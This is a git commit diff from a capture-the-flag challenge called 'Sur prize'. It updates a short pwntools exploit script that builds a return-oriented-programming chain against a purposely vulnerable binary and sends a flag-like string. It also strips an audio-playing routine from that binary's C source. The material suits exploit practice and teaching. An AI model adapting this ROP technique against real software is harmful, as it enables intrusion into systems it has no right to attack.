225eaf98631efd293ea20b1f3e0fb962ad228394
0wnerD1ed <l7z@0b1t.tech>
2025-12-27 03:52:50 +0800

    fix up surprize
    Signed-off-by: 0wnerD1ed <l7z@0b1t.tech>

--- Sur prize/exp.py
+++ Sur prize/exp.py
@@ -4,21 +4,20 @@ context.log_level = "debug"
 
 context.binary = elf = ELF("./vuln")
 io = elf.process()
+# io = remote("localhost", 9999)
 
 rop = ROP(elf)
 
-io.recv()
 io.sendline()
-sleep(1)
 
 payload = p64(rop.find_gadget(["ret"])[0])
 payload += p64(elf.sym.gets)
 payload += p64(elf.sym.gets)
 payload += p64(elf.sym.wutihave)
-#payload += p64(elf.sym.leimicc)
+# payload += p64(elf.sym.leimicc)
 
 io.sendline(payload)
-io.sendline()
-io.sendline(b"flag`b6bc358df010e8a4a458f23b71146c24")
+io.sendline(b"")
+io.sendline(b"flag`35087a865668b8c4dd423f38cd5a0298")
 
 io.interactive()
--- Sur prize/vuln.c
+++ Sur prize/vuln.c
@@ -1,50 +1,33 @@
-/*
- * UniCTF Challenge - Sur prize
- * 
- * Animation based on IOCCC 2024 entry "weaver" by weaver
- * Original: https://www.ioccc.org/2024/weaver/
- * Copyright © 1984-2025 by Landon Curt Noll and Leonid A. Broukhis.
- * Licensed under CC BY-SA 4.0: https://creativecommons.org/licenses/by-sa/4.0/
- * 
- * Modified for CTF challenge purposes
- */
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <math.h>
 #include <sys/stat.h>
 #include <termios.h>
 #include <fcntl.h>
 #include <signal.h>
 
-char *A = "~\\^__a^\\Z~\\\\^_ZZffa~\\^__a^\\Z~\\\\^_\\Zaaaca~_~ac_aaacaZ~\\^_\\aca~ZZZ\\ccaZZ\\Zaa_ZZ\\Z_a^\\ZZa_ZZ\\Zcca~ZZ\\Zf^_^\\ZZ\\Z_a^\\ZZa_~__\\_a~^\\Z~\\\\^_\\Zffaca_\\\\^_\\_a^\\Z~\\\\^_\\Z~acca_~ac_aaacaZ~\\^_\\aca~ZZZ\\ccaZZ\\Zaa_ZZ\\Z_a^\\ZZa_ZZ\\ZccaZZ\\Zf^_^\\ZZ\\Z_a^\\ZZa_~ZZ\\ZccaZZ\\Zaa_ZZ\\Z_a^\\ZZa_ZZ\\",
-     *B = "?<<<<<=;?E<<<<><><>D<<<<<=;?E<<<<<><<<<?=C;<<<<<<<>>B<<<><<?;;;;;==@;;;;==@;;;;><=;><>B;;;;==?;;;;;><;;>;;;;><=;><>@B<<<<?=<<@@<<<<<@<<><<><<<<<<><<@@<<<<<?;<<>@C;<<<<<<<>>B<<<><<?;;;;;==@;;;;==@;;;;><=;><>B;;;;==@;;;;><;;>;;;;><=;><>@<;;;;==@;;;;==@;;;;><=;><>B;;;",
-     *C = "~L~N~K~L~L~N~K~L~L~N~K~L~L~N~K~D~D~B~B~D~D~B~B~L~N~K~L~L~N~K~L~L~N~K~L~L~N~K~L~L~N~K~L~L~N~K~L~L~N~K~L~L~N~K~L~D~D~B~B~D~D~B~B~L~N~K~L~L~N~K~L~L~N~K~L~L~N~K~L~L~N~K~L~L~N~K~L",
-     *D = ";?;???;>@?;???;>@?;???;???;>@D@?;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;???;?",
-     E[] = "ZxZxZxZxZxZxZl`<^<ZxZ>_>^>ZxZ<Nb@NZxZ<NTRd<NZxZ<QNQb>ZxZ>Q[<b<ZxZ>QVQRZxZBh<RZxZBh<RWh<ZxZ<h<QWhBZtOJVg<hDZnh<OJg<hHZjh@Jg<hHZjh@Jg<hHZjh@Jg<hHZjh@Jg<hJZhh@Jg<Qh@Yh>Zhh@Jg<a<h>Yh>Zhh@Jg<Xa<h<Yh@ZH~",
+const char *INFO_HEADER =
+	"UniCTF Challenge - Sur prize\n"
+	"\n"
+	"Animation based on IOCCC 2024 entry \"Sur prize\" by weaver\n"
+	"Original: https://www.ioccc.org/2024/weaver/\n"
+	"Copyright © 1984-2025 by Landon Curt Noll and Leonid A. Broukhis.\n"
+	"Licensed under CC BY-SA 4.0: https://creativecommons.org/licenses/by-sa/4.0/\n"
+	"\n"
+	"Modified for CTF challenge purposes\n";
+
+char E[] =
+	"ZxZxZxZxZxZxZl`<^<ZxZ>_>^>ZxZ<Nb@NZxZ<NTRd<NZxZ<QNQb>ZxZ>Q[<b<ZxZ>QVQRZxZBh<RZxZBh<RWh<ZxZ<h<QWhBZtOJVg<hDZnh<OJg<hHZjh@Jg<hHZjh@Jg<hHZjh@Jg<hHZjh@Jg<hJZhh@Jg<Qh@Yh>Zhh@Jg<a<h>Yh>Zhh@Jg<Xa<h<Yh@ZH~",
      G[] = "ZxZxZxZ>]<^<ZxZ@^<_<NZxZ>Na<RNZxZ>MQRSNZxZ<RPLRLQZxZ<a<VQRQZxZ>QVQRZxZ@a<RZxZBa<RZxZBa>Wh<Zv_<Wh<WhDZlXOXOWh<WhFZjh@Wh<WhFZjXYh>Jg<hFZjhBJg<hFZjhBJWhJZhhBJWh<Qb<Xi<h<Zfi>h<JWh<Qb<XYh@Zbh<i<h<JWh>a<YhBZbh@QXJWh>i>hDZbh<a>JWXiBhBZdi<Ra<JXiFZP~",
      H[] = "ZxZxZxZxZL`BZxZ>N_<^<ZxZ>TQRSTZxZ<TQKb<TZxZ<La<RTZxZ>a>KRQZxZ>Va<RZxZ@f<RZxZBa<RWZxZ>WQh<Wh<ZtOXOWJh<Wh@Znh@g<h<WhBZjhBg<JWhFZhhDWJWhFZhhDWJWhFZhXYh@WJhHZhXYh@WJhHZhXi<h>WJh>a<Rh<ZhXi<h>WJh>b<Qh<ZhXi<h>WJh>a>h<ZhXi>h<WJh>YQh>ZP~",
-     *I = "/usr/bin/aplay", *h[] = { E, G, G, H, H, G, G, E }, *b, *n, *l, *W;
+     *h[] = { E, G, G, H, H, G, G, E }, *W;
 
-int f[64], o = 0, w, i = 0, s = 0, S = 0, j, d, x, c, r, Z = 704e3,
-	   g[] = { 9474192,  11302972, 13664348, 14718064, 6572056, 4466688,
-		   9985064,  13660272, 14715016, 15507616, 8677424, 11549756,
-		   12605528, 13158600, 4210752,	 2895872 };
+int i = 0, S = 0, x, c, r, Z = 704e3,
+    g[] = { 9474192,  11302972, 13664348, 14718064, 6572056, 4466688,
+	    9985064,  13660272, 14715016, 15507616, 8677424, 11549756,
+	    12605528, 13158600, 4210752,  2895872 };
 
-pid_t pid = 0;
 volatile int alive = 1;
-
-void a(char *N, char *L)
-{
-	for (n = N, l = L; *n; n++, l++) {
-		d = (*l - 58) * 1e3;
-		w = *n > 'z' ? 0 : 8e3 / f[*n - 58];
-		for (j = 0; j < d; j++, o++)
-			if (w && (j % w < w / 2))
-				b[o] += (j > d / 2) ? 32 : 63;
-	}
-}
 
 int gogogo()
 {
@@ -74,33 +57,6 @@ int gogogo()
 
 void lmao()
 {
-	FILE *P;
-	for (i = 0; i < 64; i++)
-		f[i] = 440 * pow(2, (i - 45) / 12.0);
-	if (!(b = calloc(Z, 1)))
-		return;
-	a(A, B);
-	o = 0;
-	a(C, D);
-
-	pid = fork();
-	if (!pid) {
-		if ((P = fopen(I, "r"))) {
-			fclose(P);
-			P = popen(I, "w");
-			s = 1;
-		}
-		if (P) {
-			fwrite(b, Z, 1, P);
-		}
-		if (!s)
-			fclose(P);
-		else
-			pclose(P);
-		for (;;)
-			sleep(1);
-	}
-
 	while (alive) {
 		W = h[S++ & 7];
 		x = 0;
@@ -123,12 +79,6 @@ void lmao()
 	}
 
 	printf("\x1b[2J\x1b[1;1H\x1b[0m");
-
-	if (pid > 0) {
-		kill(pid, 9);
-	}
-
-	free(b);
 }
 
 void init()
